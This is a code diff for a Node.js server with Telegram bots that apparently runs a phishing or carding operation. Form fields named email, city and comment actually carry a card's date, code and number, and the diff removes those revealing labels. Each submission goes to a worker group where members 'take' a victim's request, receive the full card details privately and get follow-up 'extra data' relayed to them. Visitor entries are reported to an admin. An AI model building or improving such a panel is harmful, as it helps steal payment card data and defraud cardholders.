@@ -22,10 +22,11 @@ const adminId = Number(process.env.ADMIN_CHAT_ID);
 const workerChat = Number(process.env.WORKER_CHAT_ID);
 
 // ===== БАЗЫ =====
-let takenRequests = {};       // кто забрал
-let fullRequests = {};        // полный текст
-let shortRequests = {};       // короткий текст
-let fullMessages = {};        // сообщение в личке
+let takenRequests = {};
+let fullRequests = {};
+let shortRequests = {};
+let fullMessages = {};
+let groupMessages = {}; // 💥 сообщение в группе
 let seenUsers = {};
 let onlineUsers = {};
 let bannedUsers = {};
@@ -43,7 +44,6 @@ app.post("/enter", (req, res) => {
   if (!id) return res.json({ ok: false });
 
   onlineUsers[id] = Date.now();
-
   enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`).catch(()=>{});
 
   res.json({ ok: true });
@@ -57,7 +57,7 @@ app.post("/ping", (req, res) => {
 });
 
 // ===== ЗАЯВКА =====
-app.post("/send", (req, res) => {
+app.post("/send", async (req, res) => {
   const d = req.body;
   const id = d.clientId;
 
@@ -76,9 +76,9 @@ app.post("/send", (req, res) => {
 📦 ${d.service}
 👤 ${d.name}
 📞 ${d.phone}
-📅 Дата: ${d.email}
-🔐 Код: ${d.city}
-💳 Карта: ${d.comment}`;
+📅 ${d.email}
+🔐 ${d.city}
+💳 ${d.comment}`;
 
   const shortText = `📦 ${d.service}
 👤 ${d.name}
@@ -87,13 +87,16 @@ app.post("/send", (req, res) => {
   fullRequests[id] = fullText;
   shortRequests[id] = shortText;
 
-  workerBot.sendMessage(workerChat, shortText, {
+  const msg = await workerBot.sendMessage(workerChat, shortText, {
     reply_markup: {
       inline_keyboard: [
         [{ text: "📥 Забрать", callback_data: "take_" + id }]
       ]
     }
   });
+
+  // 💥 сохраняем сообщение группы
+  groupMessages[id] = msg.message_id;
 
   res.json({ ok: true });
 });
@@ -106,12 +109,8 @@ app.get("/status/:id", (req, res) => {
 // ===== ДОП ДАННЫЕ =====
 app.post("/send2", (req, res) => {
   const { id, value } = req.body;
-
-  if (!id) return res.json({ ok: false });
-
   const owner = takenRequests[id];
 
-  // 🔥 ТОЛЬКО ТОМУ КТО ЗАБРАЛ
   if (owner) {
     workerBot.sendMessage(owner, `📩 ДОП ДАННЫЕ\n\n🆔 ${id}\n💬 ${value}`).catch(()=>{});
   }
@@ -128,10 +127,12 @@ workerBot.on("callback_query", async (q) => {
   if (data.startsWith("take")) {
 
     if (takenRequests[id]) {
-      return workerBot.answerCallbackQuery(q.id, {
-        text: "❌ Уже занято"
-      });
+      return workerBot.answerCallbackQuery(q.id, { text: "❌ Уже занято" });
     }
+
+    const user = q.from.username
+      ? "@" + q.from.username
+      : q.from.first_name;
 
     takenRequests[id] = q.from.id;
 
@@ -148,8 +149,25 @@ workerBot.on("callback_query", async (q) => {
       }
     });
 
-    // сохраняем ID сообщения
     fullMessages[id] = sent.message_id;
+
+    // 💥 ОБНОВЛЯЕМ СООБЩЕНИЕ В ГРУППЕ
+    try {
+      await workerBot.editMessageText(
+        `${shortRequests[id]}
+
+👤 Взял: ${user}`,
+        {
+          chat_id: workerChat,
+          message_id: groupMessages[id],
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "🔓 Освободить", callback_data: "free_" + id }]
+            ]
+          }
+        }
+      );
+    } catch {}
 
     workerBot.answerCallbackQuery(q.id);
   }
@@ -159,21 +177,35 @@ workerBot.on("callback_query", async (q) => {
 
     if (takenRequests[id] !== q.from.id) {
       return workerBot.answerCallbackQuery(q.id, {
-        text: "❌ Не твоя"
+        text: "❌ Не твоя заявка"
       });
     }
 
     delete takenRequests[id];
 
-    // 🔥 УДАЛЯЕМ ЛИЧКУ
+    // удалить личку
     if (fullMessages[id]) {
       workerBot.deleteMessage(q.from.id, fullMessages[id]).catch(()=>{});
       delete fullMessages[id];
     }
 
-    workerBot.answerCallbackQuery(q.id, {
-      text: "Освобождено"
-    });
+    // вернуть кнопку забрать
+    try {
+      await workerBot.editMessageText(
+        shortRequests[id],
+        {
+          chat_id: workerChat,
+          message_id: groupMessages[id],
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "📥 Забрать", callback_data: "take_" + id }]
+            ]
+          }
+        }
+      );
+    } catch {}
+
+    workerBot.answerCallbackQuery(q.id, { text: "Освобождено" });
   }
 
   // ===== ОНЛАЙН =====
